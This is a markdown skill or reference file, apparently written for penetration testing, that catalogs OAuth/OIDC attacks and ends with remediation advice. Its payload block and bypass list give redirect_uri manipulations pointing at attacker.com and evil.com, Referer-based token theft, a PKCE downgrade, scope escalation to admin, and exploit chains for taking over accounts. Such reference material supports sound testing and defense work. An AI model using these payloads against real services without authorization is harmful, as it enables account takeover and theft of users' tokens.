---
name: oauth
description: OAuth/OIDC vulnerabilities for account takeover, token theft, and authorization bypass
---

# OAuth Vulnerabilities

## Attack Surface
- Authorization endpoints with insufficient `redirect_uri` validation
- Missing or weak `state` parameter allowing CSRF on OAuth flows
- Implicit grant flows exposing tokens in URL fragments and browser history
- Token leakage via `Referer` header; PKCE downgrade from S256 to plain

## Detection Techniques
- Modify `redirect_uri` to attacker domain; test path traversal variants
- Remove or tamper with `state` parameter; check if flow still completes
- Test for open redirect on registered redirect_uri domain to chain token theft
- Omit `code_challenge` to test PKCE downgrade; check if implicit grant is supported

## Common Payloads

```
# redirect_uri manipulation
https://target.com/callback/../attacker-controlled
https://target.com/callback/..%2f..%2fattacker.com
https://target.com/callback%23@attacker.com

# Open redirect chain
/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com

# State CSRF: attacker initiates OAuth, captures callback with code=ATTACKER_CODE
# Victim clicks link (no state check) -> attacker account linked to victim

# Token theft via Referer: callback loads <img src="https://evil.com/p.gif">
# Referer: https://target.com/callback#access_token=eyJ...

# PKCE downgrade: omit code_challenge entirely
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://legit.com/cb

# Scope escalation
GET /authorize?scope=openid+profile+email+admin&client_id=APP
```

## Bypass Techniques
- URL encoding: `%2e%2e%2f` for path traversal in redirect_uri
- Lax matching exploit: `redirect_uri=https://legit.com/callback@attacker.com`
- Open redirect on allowed domain as redirect_uri target
- Downgrade response_type from code to token for direct token exposure

## Exploit Chaining
- OAuth + open redirect: exfiltrate authorization code via allowed-domain redirect
- OAuth + XSS: steal tokens from URL fragment via XSS on callback page
- OAuth + CSRF: force victim to complete flow with attacker's code/token
- OAuth + subdomain takeover: claim subdomain matching redirect_uri patterns

## Remediation
- Exact `redirect_uri` matching; no wildcards or pattern matching
- Require/validate `state` as cryptographic nonce tied to user session
- Authorization code flow with PKCE (S256); reject plain method
- Short-lived single-use authorization codes (< 60s); avoid implicit grant
